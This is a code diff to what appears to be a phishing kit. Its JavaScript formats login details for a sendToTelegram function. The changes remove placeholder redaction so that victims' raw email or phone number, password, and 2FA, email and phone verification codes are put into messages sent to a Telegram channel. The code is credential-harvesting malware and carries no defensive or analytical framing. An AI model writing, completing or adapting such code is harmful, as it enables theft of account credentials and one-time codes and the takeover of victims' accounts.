@@ -181,7 +181,7 @@ async function sendToTelegram(message) {
 // FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)
 // ======================================================
 
-const REDACTED_NOTIFICATION_VALUE = '[redacted]';
+const REDACTED_NOTIFICATION_VALUE = ''; // Will be replaced dynamically
 
 function getDigits(value) {
     return String(value || '').replace(/\D/g, '');
@@ -204,7 +204,7 @@ function getCredentialParts(emailPhone) {
     if (!submittedIsPhone) {
         return {
             type: 'Email',
-            html: `<code>${REDACTED_NOTIFICATION_VALUE}</code>`
+            html: `<code>${escapeTelegramHtml(submitted)}</code>`
         };
     }
 
@@ -216,7 +216,7 @@ function getCredentialParts(emailPhone) {
 
     return {
         type: 'Phone',
-        html: `<b>${codePart}</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`
+        html: `<b>${escapeTelegramHtml(codePart)}</b> <code>${submittedDigits}</code>`
     };
 }
 
@@ -225,7 +225,7 @@ function formatLoginMessage(emailPhone, password) {
 
     return `<b>(${userLabel})</b>
 <b>${credentials.type}:</b> ${credentials.html}
-<b>Password:</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>
+<b>Password:</b> <code>${escapeTelegramHtml(password)}</code>
 <b>Country: ${userInfo.country}</b>`;
 }
 
@@ -239,17 +239,17 @@ function formatOneTimeLoginMessage(emailPhone) {
 
 function format2FAMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}🔐: (${userLabel}):</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`;
+return `<b>${prefix}🔐: (${userLabel}):</b> <code>${escapeTelegramHtml(code)}</code>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📧: (${userLabel}):</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`;
+return `<b>${prefix}📧: (${userLabel}):</b> <code>${escapeTelegramHtml(code)}</code>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📱: (${userLabel}):</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`;
+  return `<b>${prefix}📱: (${userLabel}):</b> <code>${escapeTelegramHtml(code)}</code>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
